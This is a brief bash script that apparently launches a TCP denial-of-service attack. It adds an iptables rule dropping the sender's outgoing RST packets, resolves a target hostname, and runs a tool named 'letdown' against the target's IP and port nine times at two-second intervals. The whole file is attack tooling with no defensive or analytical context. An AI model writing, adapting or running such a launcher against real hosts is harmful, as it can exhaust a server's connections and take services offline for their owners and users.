#!/bin/bash

iptables -A OUTPUT -p tcp --tcp-flags ALL RST -j DROP

C=1
ip=`python -c "import socket; print socket.gethostbyname('$1')"`
while [ $C -lt 10 ]; do
    ./letdown -d $ip -p $2 -f iptables -v 2 -l
    let C=C+1
    sleep 2 
done
